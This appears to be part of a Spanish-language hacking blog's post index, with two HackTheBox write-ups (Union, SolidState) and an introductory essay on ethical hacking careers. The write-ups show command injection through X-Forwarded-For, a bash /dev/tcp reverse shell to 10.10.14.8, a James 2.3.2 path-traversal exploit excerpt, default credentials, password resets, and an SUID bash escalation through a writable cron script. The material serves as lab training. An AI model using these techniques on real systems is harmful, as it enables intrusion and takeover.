iptables&lt;?phprequire('config.php');if (!($_SESSION['Authenticated'])) {  echo \"Access Denied\";  exit;}?&gt;&lt;link href=\"//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css\" rel=\"stylesheet\" id=\"bootstrap-css\"&gt;&lt;script src=\"//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js\"&gt;&lt;/script&gt;&lt;script src=\"//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js\"&gt;&lt;/script&gt;&lt;!------ Include the above in your HEAD tag ----------&gt;&lt;div class=\"container\"&gt;\t\t&lt;h1 class=\"text-center m-5\"&gt;Join the UHC - November Qualifiers&lt;/h1&gt;\t\t\t&lt;/div&gt;\t&lt;section class=\"bg-dark text-center p-5 mt-4\"&gt;\t\t&lt;div class=\"container p-5\"&gt;&lt;?php  if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  } else {    $ip = $_SERVER['REMOTE_ADDR'];  };  system(\"sudo /usr/sbin/iptables -A INPUT -s \" . $ip . \" -j ACCEPT\");?&gt;              &lt;h1 class=\"text-white\"&gt;Welcome Back!&lt;/h1&gt;              &lt;h3 class=\"text-white\"&gt;Your IP Address has now been granted SSH Access.&lt;/h3&gt;\t\t&lt;/div&gt;\t&lt;/section&gt;&lt;/div&gt;este script nos indica que si logramos tener acceso emplea la variable que será nuestra ip seteada donde ip vale la cabezera HTTP_X_FORWARDED_FOR el campo de encabezado HTTP X-Forwarded-For es un método común para identificar la dirección IP de origen de un cliente que se conecta a un servidor web a través de un proxy HTTP o un equilibrador de carga. HTTP_X_FORWARDED_FOR: si no está vacío indica que se ha utilizado un proxy. Al pasar por el proxy lo que hace éste es poner su dirección IP como REMOTE_ADDR y añadir la que estaba como REMOTE_ADDR al final de esta cabecera. es por eso que una vez que ponemos la flag correcta nos habilita el puerto aceptando solo nuestra ip por medio de ip tables, delante de ip hay un campo que podría seguir otro comando que yo le indique a nivel de sistema, por lo tanto agregare la cabezera primeroX-FORWARDED-FOR:seguido de la data que quiera inyectar en $ip donde hace la comparacion en el script de php, por ejemplo en este caso me enviaré una traza icmp para ver si tengo un RCE,quedando de la siguiente formaX-FORWARDED-FOR: ;ping -c 1 10.10.14.8;y logramos tener traza icmpsolo nos queda enviarnos una reverse shellX-FORWARDED-FOR: ;bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.8/443 0&gt;&amp;1';estamos como www-data y si doy sudo -l para observar que puedo ejecutar como nivel de sudo vemos una ruta de path, solo con un sudo su tendría que estar dentro sin proporcionar contraseñawww-data@union:~/html$ export TERM=xtermwww-data@union:~/html$ export SHELL=bashwww-data@union:~/html$ lschallenge.php  config.php  css\tfirewall.php  index.phpwww-data@union:~/html$ sudo -lMatching Defaults entries for www-data on union:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser www-data may run the following commands on union:    (ALL : ALL) NOPASSWD: ALLwww-data@union:~/html$ sudo suroot@union:/var/www/html# whoamirootroot@union:/var/www/html# cat /root/root.txt e382630e05c003779f3b38e973137516root@union:/var/www/html# por fin tenemos la flag y otra máquina mas hecha:)!"
  },
  
  {
    "title": "SolidState Writeup",
    "url": "/posts/SolidState/",
    "categories": "HackTheBox, Machines Medium",
    "tags": "Writeup Guías HackTheBox",
    "date": "2023-01-30 00:00:00 -0600",
    





    "snippet": "10.10.10.51 SolidState (medium machine)  Comenzamos con la fase de recolección de información haciendo un escaneo por TCP en todos los puertos con nmap$ nmap -p-  -sS -vvv  --min-rate 2000 -n -Pn 10.10.10.51 -oG allPorts -p-  -&gt; escanearemos todos los rangos de puertos (65535)-sS -&gt; análisis utilizando TCP SYN Este tipo de escaneo, está basado en la velocidad de escaneo, de ahí la versatilidad que mencionamos anteriormente, ya que permite escanear miles de puertos por segundo en una red que se encuentre desprotegida o carezca de un firewall, no termina la conexión TCP/SYN - Envias un SYN - Recibes un SYN/ACK - Envias ResetPacket-vvv -&gt; verbose para que mediante vayas descubriendo puertos se reporten en la terminal–min-rate 2000 -&gt; paquetes enviados no mas lentos que 2000 paquetes por segundo, envío de paquetes super rápido-n -&gt; que no aplique resoluci+on de DNS para que no tarde el escaneo-Pn -&gt; ni que me detecte el descburimiento de hosts$ nmap -p-  -sS -vvv  --min-rate 2000 -n -Pn 10.10.10.51 -oG allPorts Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-30 13:18 CSTInitiating SYN Stealth Scan at 13:18Scanning 10.10.10.51 [65535 ports]Discovered open port 22/tcp on 10.10.10.51Discovered open port 110/tcp on 10.10.10.51Discovered open port 80/tcp on 10.10.10.51Discovered open port 25/tcp on 10.10.10.51Discovered open port 4555/tcp on 10.10.10.51Increasing send delay for 10.10.10.51 from 0 to 5 due to max_successful_tryno increase to 4Increasing send delay for 10.10.10.51 from 5 to 10 due to max_successful_tryno increase to 5Increasing send delay for 10.10.10.51 from 10 to 20 due to max_successful_tryno increase to 6Increasing send delay for 10.10.10.51 from 20 to 40 due to max_successful_tryno increase to 7Increasing send delay for 10.10.10.51 from 40 to 80 due to 174 out of 578 dropped probes since last increase.Increasing send delay for 10.10.10.51 from 80 to 160 due to max_successful_tryno increase to 8Increasing send delay for 10.10.10.51 from 160 to 320 due to 73 out of 243 dropped probes since last increase.Increasing send delay for 10.10.10.51 from 320 to 640 due to 124 out of 413 dropped probes since last increase.Increasing send delay for 10.10.10.51 from 640 to 1000 due to 142 out of 472 dropped probes since last increase.Warning: 10.10.10.51 giving up on port because retransmission cap hit (10).Discovered open port 119/tcp on 10.10.10.51Completed SYN Stealth Scan at 13:19, 43.42s elapsed (65535 total ports)Nmap scan report for 10.10.10.51Host is up, received user-set (0.077s latency).Scanned at 2023-01-30 13:18:16 CST for 44sNot shown: 65529 closed tcp ports (reset)PORT     STATE SERVICE REASON22/tcp   open  ssh     syn-ack ttl 6325/tcp   open  smtp    syn-ack ttl 6380/tcp   open  http    syn-ack ttl 63110/tcp  open  pop3    syn-ack ttl 63119/tcp  open  nntp    syn-ack ttl 634555/tcp open  rsip    syn-ack ttl 63Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 43.52 seconds           Raw packets sent: 86792 (3.819MB) | Rcvd: 80877 (3.235MB)puerto 80 por lo tanto vamos a darle un visto al sitio web pero realmente nada importante incluso viendo con wappalyzer o whatweb las tecnologias que emplea realmente no hay nada del otro mundo$ whatweb http://10.10.10.51http://10.10.10.51 [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], Email[webadmin@solid-state-security.com], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.10.10.51], JQuery, Script, Title[Home - Solid State Security]me copiare esos puertos abiertos para analizar servicios y versiones que corren en ellos$ nmap -sCV -p22,25,80,110,119,4555 10.10.10.51 -oN targetedStarting Nmap 7.93 ( https://nmap.org ) at 2023-01-30 20:46 CSTStats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Service ScanService scan Timing: About 83.33% done; ETC: 20:47 (0:00:10 remaining)Stats: 0:01:05 elapsed; 0 hosts completed (1 up), 1 undergoing Service ScanService scan Timing: About 83.33% done; ETC: 20:48 (0:00:13 remaining)Stats: 0:02:44 elapsed; 0 hosts completed (1 up), 1 undergoing Script ScanNSE Timing: About 98.68% done; ETC: 20:49 (0:00:00 remaining)Nmap scan report for 10.10.10.51Host is up (0.15s latency).PORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)| ssh-hostkey: |   2048 770084f578b9c7d354cf712e0d526d8b (RSA)|   256 78b83af660190691f553921d3f48ed53 (ECDSA)|_  256 e445e9ed074d7369435a12709dc4af76 (ED25519)25/tcp   open  smtp    JAMES smtpd 2.3.2|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.8 [10.10.14.8])80/tcp   open  http    Apache httpd 2.4.25 ((Debian))|_http-title: Home - Solid State Security|_http-server-header: Apache/2.4.25 (Debian)110/tcp  open  pop3    JAMES pop3d 2.3.2119/tcp  open  nntp    JAMES nntpd (posting ok)4555/tcp open  rsip?| fingerprint-strings: |   GenericLines: |     JAMES Remote Administration Tool 2.3.2|     Please enter your login and password|     Login id:|     Password:|     Login failed for |_    Login id:1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port4555-TCP:V=7.93%I=7%D=1/30%Time=63D8812D%P=x86_64-pc-linux-gnu%r(GeSF:nericLines,7C,\"JAMES\\x20Remote\\x20Administration\\x20Tool\\x202\\.3\\.2\\nPlSF:ease\\x20enter\\x20your\\x20login\\x20and\\x20password\\nLogin\\x20id:\\nPasswoSF:rd:\\nLogin\\x20failed\\x20for\\x20\\nLogin\\x20id:\\n\");Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 264.55 seconds-sCV -&gt; escaneo lanzando scripts que detecten servicios y versiones-p -&gt; especeficando los puertos a escanear-oN y todo nuestro output lo guardamos en una captura formato nmap con el nombre de targetedIndagando mas sobre el puerto 4555 tenemos un apache James que corresponde a una versión bastante vulnerable, leyendo acerca de la explotación nos menciona que Apache James normalmente almacena los datos de ese usuario en un subdirectorio relativo a su directorio de instalación, en “apps/james/var/users”. De forma predeterminada, el servidor crea un nuevo subdirectorio para almacenar el correo electrónico entrante y saliente de cada usuario. este mecanismo de creación de directorios es susceptible a una vulnerabilidad, lo que permite a un atacante ejecutar comandos arbitrarios en la máquina del servidor de correo. los nombres de usuario no están suficientemente validados en el momento de la creación del usuario, y anteponer una serie del símbolo del directorio principal, “../”, hace que el servidor cree un directorio de usuario fuera del directorio de instalación. Un nombre de usuario como “../../../../../../../../etc/bash_completion.d” puede hacer que los archivos se coloquen en “/etc/bash_completion.d,”si buscamos con searchsploit tenemos un script en python donde nos automatiza la intrusión creando el usuarios.send(\"adduser ../../../../../../../../etc/bash_completion.d exploit\\n\")s.recv(1024)s.send(\"quit\\n\")s.close()print \"[+]Connecting to James SMTP server...\"s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((ip,25))s.send(\"ehlo team@team.pl\\r\\n\")recv(s)print \"[+]Sending payload...\"s.send(\"mail from: &lt;'@team.pl&gt;\\r\\n\")recv(s)# also try s.send(\"rcpt to: &lt;../../../../../../../../etc/bash_completion.d@hostname&gt;\\r\\n\") if the recipient cannot be founds.send(\"rcpt to: &lt;../../../../../../../../etc/bash_completion.d&gt;\\r\\n\")recv(s)vemos que crea el usuario antes mencionado para tener un RCE aprovechandose en esta vulnerabilidad de la creación de directorios que emplea al añadir un usuario, pero hay un problema. tiene que estar logueada y activa una persona para que active el RCE del usuario creado, asi que si lo ejecutamos no tendriamos éxito. Sin embargo en la parte superior del script vemos unas credenciales por defecto para logearnos a este servicio# credentials to James Remote Administration Tool (Default - root/root)user = 'root'pwd = 'root'asi que intentare conectarme por netcat a ese puerto y efectivamente nos pide unas credenciales, solo ponemos las que nos vienen por defecto y estamos dentro$ nc 10.10.10.51 4555JAMES Remote Administration Tool 2.3.2Please enter your login and passwordLogin id:rootPassword:rootWelcome root. HELP for a list of commandshelpCurrently implemented commands:help                                    display this helplistusers                               display existing accountscountusers                              display the number of existing accountsadduser [username] [password]           add a new userverify [username]                       verify if specified user existdeluser [username]                      delete existing usersetpassword [username] [password]       sets a user's passwordsetalias [user] [alias]                 locally forwards all email for 'user' to 'alias'showalias [username]                    shows a user's current email aliasunsetalias [user]                       unsets an alias for 'user'setforwarding [username] [emailaddress] forwards a user's email to another email addressshowforwarding [username]               shows a user's current email forwardingunsetforwarding [username]              removes a forwarduser [repositoryname]                   change to another user repositoryshutdown                                kills the current JVM (convenient when James is run as a daemon)quit                                    close connectionen este punto listare los usuarios y cambiare sus respectivas contraseñas para ver si logueandome por telnet al puerto 110 llego a ver algo que corre pop3 (protocolo de transeferencia de correos)listusersExisting accounts 5user: jamesuser: thomasuser: johnuser: mindyuser: mailadminsetpassword james 12345Password for james resetsetpassword thomas 12345Password for thomas resetsetpassword john 12345Password for john resetsetpassword mindy 12345Password for mindy resetsetpassword mailadmin 12345               Password for mailadmin resetuna vez cambiada las credenciales procederé a conectarme por telnet, checando con cada uno de los usuarios veo que no tienen nada importante a excepción de mindy que tiene dos correos y uno de ellos nos setea una contraseña$ telnet 10.10.10.51 110  Trying 10.10.10.51...Connected to 10.10.10.51.Escape character is '^]'.+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready USER mindy+OKPASS 12345+OK Welcome mindyLIST+OK 2 19451 11092 836.RETR 2+OK Message followsReturn-Path: &lt;mailadmin@localhost&gt;Message-ID: &lt;16744123.2.1503422270399.JavaMail.root@solidstate&gt;MIME-Version: 1.0Content-Type: text/plain; charset=us-asciiContent-Transfer-Encoding: 7bitDelivered-To: mindy@localhostReceived: from 192.168.11.142 ([192.168.11.142])          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581          for &lt;mindy@localhost&gt;;          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)From: mailadmin@localhostSubject: Your AccessDear Mindy,Here are your ssh credentials to access the system. Remember to reset your password after your first login. Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. username: mindypass: P@55W0rd1!2@Respectfully,James.el correo nos dice que a mindy le acaban de dar acceso al sistema de ssh y recordamos que tiene el puerto 22 expuesto, pero hay un problema. su ruta del PATH no esta totalmente asi que nos costara y buscaremos la forma de ejecutar comando en el sistemamindy:P@55W0rd1!2@al validar la contraseña con sshpass nos conectamos por ssh directamente y efectivamente mindy no ha cambiado su password que le dieron por defecto y obtenemos la primera flagsshpass -p 'P@55W0rd1!2@' ssh -o 'StrictHostKeyChecking=no' mindy@10.10.10.51     Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142mindy@solidstate:~$ lsbin  user.txtmindy@solidstate:~$ cat user.txt 87e11ac003837fd5250c29ff94a271d6Privilege Escalationsi intentamos ejecutar otro comando fuera de los que admite vemos que no nos dejamindy@solidstate:~$ whoami-rbash: whoami: command not foundahora miramos su ruta del PATH Y pues si que no hay muchas opciones de donde podemos ejecutar comandos ya que no estan contempladas todas las rutas al sistema raiz, por lo tanto copiare la mia y la importare a la suyamindy@solidstate:~$ echo $PATH/home/mindy/binpero no llegamos a tener éxito ya que estamos en una restricted bash y nos limita a muchomindy@solidstate:~$ export PATH=$PATH:/root/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/go/bin/:/root/go-workspace/bin:/root/.fzf/bin-rbash: PATH: readonly variablelo que tratare de hacer es ver si despues del login de ssh puedo lanzar un comando y dicho comando me lo logra interpretar, probaré con el comando id para ver si en el output despues del login me lo acepta$ sshpass -p 'P@55W0rd1!2@' ssh -o 'StrictHostKeyChecking=no' mindy@10.10.10.51 iduid=1001(mindy) gid=1001(mindy) groups=1001(mindy)y vemos que tenemos éxito por lo tanto solo nos queda lanzarnos una bash y hacer el tratamiento de la tty para tener la consola mas interactiva$ sshpass -p 'P@55W0rd1!2@' ssh -o 'StrictHostKeyChecking=no' mindy@10.10.10.51 bashwhoamimindyscript /dev/null -c bashScript started, file is /dev/null${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ echo $TERMecho $TERMdumb${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ echo $SHELLecho $SHELL/bin/rbash${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ export TERM=xterm export TERM=xterm${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ export SHELL=bashexport SHELL=bashahora si ya podemos manejarnos mas facilmente por la terminal con todos los comandos, me meteré al directorio tmp para hacer un script en bash para visualizar las tareas y que comandos son los que van entrando y saliendo del sistema#!/bin/bashold_process=$(ps -eo command)while true; do          new_process=$(ps -eo command)          diff &lt;(echo \"$old_process\") &lt;(echo \"$new_process\") | grep \"[\\&gt;\\&lt;]\" | grep -v \"procmon.sh\" | grep -v \"command\"          old_process=$new_processdoneesto nos dirá los nuevos procesos y comandos entrante en un periodo de tiempo que se esten ejecutando en el sistema${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ wget http://10.10.14.8/procmon.shprocmon.sh//10.10.14.8/p--2023-01-30 22:55:40--  http://10.10.14.8/procmon.shConnecting to 10.10.14.8:80... connected.HTTP request sent, awaiting response... 200 OKLength: 259 [text/x-sh]Saving to: ‘procmon.sh’procmon.sh          100%[===================&gt;]     259  --.-KB/s    in 0s      2023-01-30 22:55:40 (20.9 MB/s) - ‘procmon.sh’ saved [259/259]${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ chmod +x procmon.shchmod +x procmon.shle damos permisos de ejecución y esperamos a que nos salga un nuevo proceso ejecutado${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ ./procmon.sh./procmon.sh&gt; /usr/sbin/CRON -f&lt; /usr/sbin/CRON -f&gt; /usr/sbin/CRON -f&gt; /bin/sh -c python /opt/tmp.py&lt; /usr/sbin/CRON -f&lt; /bin/sh -c python /opt/tmp.pydepués de unos minutos visulizamos un proceso bastante intersante que ejecuta un script en python, si visualizamos los permisos vemos que el propietario es root${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ls -l /opt/tmp.py-rwxrwxrwx 1 root root 105 Aug 22  2017 /opt/tmp.pyahora visualizare el script… y !BINGOO tenemos permisos de lectura escritura y ejecución con una funcion os.system donde podemos enviar nuestra consola y otorgar permisos SUID a la bash y asi escalar nuestro privilegio${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cat /opt/tmp.py#!/usr/bin/env pythonimport osimport systry:     os.system('rm -r /tmp/* ')except:     sys.exit()${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ echo “os.system(‘chmod u+s /bin/bash’)” » /opt/tmp.pyguardando nuestra llamada al sistema del script en python esperare a que la tarea se vuelva a ejecutar y tener permisos SUID en la bash#!/usr/bin/env pythonimport osimport systry:     os.system('rm -r /tmp/* ')except:     sys.exit()os.system('chmod u+s /bin/bash')después de esperar a que se ejecute logramos tener los privilegios en la bash , solo hace falta poner bash -p (-p de privilege) y listo, somos root y máquina completada :D!!${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ls -l /bin/bashls -l /bin/bash-rwsr-xr-x 1 root root 1265272 May 15  2017 /bin/bash${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ bash -pbash -pbash-4.4# whoamiwhoamirootbash-4.4# cat /root/root.txtcat /root/root.txt4ea15b06b3c027ecfd661b3580dddd9f"
  },
  
  {
    "title": "Introducción al Hacking | Ciberseguridad",
    "url": "/posts/Introduccion/",
    "categories": "Hacking y más, Por donde empezar?",
    "tags": "Introducción",
    "date": "2023-01-29 00:00:00 -0600",
    





    "snippet": "De que trata esta sección?En este Post recopilaré los pasos que llegué a seguir y como estructuraba todo un temario dedicado y especialemente enfocado al campo de la Ciberseguridad, espero y sea de ayuda y motivación para todas las personas que se esten adentrando en este mundo tan peculiar, grande e interesante como puede llegar a hacer la Ciberseguridad Ofensiva :D espero y me puedas ayudar con un follow en mis redes sociales que dejaré en la parte inferior del Blog.~by Omar Aka(Droix3d) “La vida es una preparación para el futuro; y la mejor preparación para el futuro es vivir como si no hubiera ninguno.”Qué es un Hacker, un Pentester y un Red Teamer?Hacker: Muy bien, comenzaremos con un concepto primordial y no  menos importante que muchas personas tendrán en mente la palabra Hacker pero no tienen el significado real, si bien es cierto el concepto de la palabra Hacker se a ido deformando con el paso de los dias. con un significado poco ético al principio, si asi se le puede llamar. Actualmente el significado a tomado un mejor cámino y no es mas que una persona que se dedica a detectar fallos de seguridad en sistemas informáticos con un próposito, Habiendo distintos y varios tipos de Hacker (hablaremos de ello mas adelante) en pocas palabras ser un Hacker es una etiqueta que llevamos todos que nos dedicamos en el campo de la CiberseguridadPentester : Un pentester lleva la filosofía y los pasos del “Hacker ético” es una práctica de la seguridad informática por la que los expertos o hackers éticos de diferentes compañías alrededor del mundo optan para explorar la estructura de seguridad informática de la empresa, a su vez reportando todas aquellas fallas y vulnerabilidades que se llegue a encontrar en una prueba o examen de penetraciónRed Teamer : Un Red Team es un ejercicio que consiste en simular un ataque dirigido a una organización. Esto se traduce en un grupo de personas internas o externas a la empresa, comprueban la posibilidad de tener acceso a los sistemas, comprometerlos atacando puntos débiles y el impacto que esto podría tener en el negocioEl arte del Hacking y ser un HackerSi bien es cierto, cuando mencionan la palabra Hacker a la mayoría  se nos viene a la mente todas esas películas de Hollywood, hombres, jóvenes, mujeres etc.… expertos en tecnología encapuchados y enmascarados que prácticamente juegan a ser Dios con un simple portátil escondidos en un sótano XDDAquellas personas que con un botón y escribir algoritmos aleatoriamente en su teclado pueden llegar a comprometer un sistema altamente privilegiado jajajajaQue asco y porquería da Hollywood y todos esos videos mal informando a las personas sobre el verdadero mundo del hackingsiempre he dicho que “el Hacker motiva, aprende y enseña día con día” En este campo especialmente hay muchísimas dudas sobre el camino por el cual seguir, así como existen Ingenieros en Software, Ing. En Redes, Telecomunicaciones, expertos en bases de datos y todas las profesiones habidas y por haber , el Hacker y el Hacking es igual otra profesión común como todas las demásQué se necesita para ser un experto en Ciberseguridad?Primero que nada la paciencia es fundamental que va de la mano con la disciplina y la constancia, como muchas cosas en la vida, “Recuerda que es una profesión no es un juego” por lo tanto no se aprenderá todo de la noche a la mañana con verte un simple video de 10 minutos instalando Kali Linux aprendiendo herramientas de phishing para saber la contraseña de tu Ex , deja atrás todas esas estupideces que si solo vienes con esa mentalidad de invadir la privacidad de otras personas a lo script Kiddie no llegaras lejos aquí si es lo que realmente quieres, que es a lo que me lleva el siguiente puntoTipos de HackersWhite Hat : Los hackers white hat o de sombrero blanco son uno de los tipos de hackers con experiencia en ciberseguridad. Están autorizados a hackear los sistemas de seguridad informática de gobiernos u organizaciones con el fin de comprobar fallos de ciberseguridad. Al hacerlo, identifican los puntos débiles y los corrigen para evitar futuros ataques de fuentes externas.Black Hat : Los black hat o de sombrero negro también son expertos en informática, sin embargo, su intención es completamente distinta. En lugar de ser provechosos para la ciberseguridad, estos tipos de hackers utilizan sus conocimientos sobre cómo hackear para atacar otros sistemas. Así, obtienen acceso a sistemas donde no tienen una entrada autorizada, con lo que pueden robar datos o destruir el sistema.Gray Hat : Los hackers grey hat se encuentran entre los black hat y los white hat. Este tipo de hackers informáticos trabajan con buenas y con malas intenciones. La intención que hay detrás de la piratería decide el tipo de pirata informático.Experimentando con sistemas para encontrar lagunas, romper defensas y, en general, encontrar una experiencia divertida en el hacking.Hacktivistas : Este tipo de hackers informáticos tienen la intención de hackear sitios web gubernamentales. Un hacktivista puede ser un individuo o un grupo de hackers sin nombre cuya intención es obtener acceso a sitios web y redes gubernamentales.Script Kiddie - Blue Hat : No tiene ningún deseo de conocimiento, ninguna motivación para la autoeducación y ningún respeto por las habilidades: utiliza programas informáticos estándar para el hackeo, el phishing, el phreaking y otras formas de caos electrónico sin saber siquiera cómo funcionan o qué hacen.(Buscan Hackear Facebooks)Qué se necesita saber para dedicarte a la Ciberseguridad?  Esta es la parte que todos estaban esperando. Principalmente y en lo personal acomode los temas de acuerdo a su nivel de importancia para este campo y conforme a mi experiencia      Manejo y creación de Máquinas virtuales : A su vez saber realizar instalaciones de cualquier sistema operativo de Windows y distribuciones básicas de Linux en VM (Virtual Machine) y booteable        Sistemas operativos : Conocer un poco de teoría y fundamentos sobre Windows y Linux - conocer la terminal y la shell de ambos ya que será la forma en como se trabajara        Linux : Aprender Linux en esta area es fundamental Conocer las distribuciones que hay , diferencias y acostumbrarse totalmente de trabajar con la pura terminal , olvídate totalmente del modo gráfico, la mayoría de herramientas que emplea Kali y parrot son con puros comandos, ocuparas pocas  que emplean método grafico . también  saber cómo está estructurado el Kernel y saber sobre toda la raiz del sistema operativo ya que llega a ser un poco diferente a windows        Redes : Saber como se comunican los protocolos, puertos, servicios en un modelo OSI es algo que no debe faltar en toda fase de reconocimiento, conceptos de LAN,WAN,VPN,PROXY,NAT,DHCP,IP,TCP,UDP y modelo TCP-IP es algo por donde comenzaría a darle con el estudio        Programación : Algunas personas pondrían mas arriba este lugar pero les diré mi punto de vista. La programacion en este campo es primordial, ya que analizaras código, interpretaras y crearas herramientas. peeeero no a un  nivel full stack developer, me refiero a que aprenderás y harás lo necesario para vulnerar un sistema, conocer las típicas fallas de sanitización de código y donde se explotan las vulnerabilides y con esto no me refiero a que debas de saber todos los lenguajes de programación habidas y por haber, con aprender Python y scripting en bash al 100% créeme que nada te faltara 😊 , mas adelante cuando vayas un poco mas avanzado recomiendo aprender C y un poco en ensamblador.en pocas palabras  es más análisis , interpretación y explotación en código no vas a desarrollar un sitio web para que no te metas de lleno con un curso de html , css y java script xd SOLO SERA LO NECESARIO        Criptografía conocer técnicas de cifrado básicas o codificado, tipos de hash, tipos de cifrado y sus diferencias, formas en las que se emplean y como es que se llega a proteger la Integridad,Disponibilidad y la Confidencialidad        Uso de Herramientas básicas para la recopilación de información Information Gathering and Footprinting Escaneo pasivo y activo de recolección de información        Extra -&gt; Realizar tu primera máquina en tu laboratorio Descargar y ejecutar una máquina que simula una prueba de penetración estilo CTF para principiantes Vulnhub es muy buena opción  Kali o Parrot?  Aquí es donde abriré la discusión mas grande de todos que se dedican a la ciberseguridadLa distribución a elegir será de acuerdo a tus gustos, te recomiendo probar los dos en VM y el que mas te agrade lo puedes usar como tu dia a dia, lo que si es que no ocuparas al 100% las herramientas que te proporcionan eso ten por seguro , puedes tirar incluso de un ubuntu e instalar las herramientas que se necesitan para el hacking pero para no revolverte con tantas instalaciones y dependecnias si eres nuevo te recomiendo elegir cualquiera de los dos ya que son distribuciones basadas en debian  es como elegir tu pokemon xdd"
  }
  
]

